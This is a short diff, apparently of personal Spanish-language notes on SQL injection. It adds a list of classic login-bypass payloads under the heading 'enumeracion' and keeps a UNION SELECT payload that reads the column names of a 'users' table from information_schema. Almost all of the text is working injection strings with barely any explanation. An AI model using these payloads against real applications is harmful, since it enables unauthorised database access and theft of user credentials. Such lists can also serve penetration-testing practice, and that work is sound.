@@ -17,3 +17,19 @@ id,username,password
 para ver archivos pero no escribirlos
 
 -1' union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='users'-- -
+
+
+enumeracion
+
+' or 0=0 --
+' or 0=0 #
+' or 0=0 #"
+' or '1'='1'--
+' or 1 --'
+' or 1=1--
+' or 1=1 or ''='
+' or 1=1 or ""=
+' or a=a--
+' or a=a
+') or ('a'='a
+'hi' or 'x'='x';
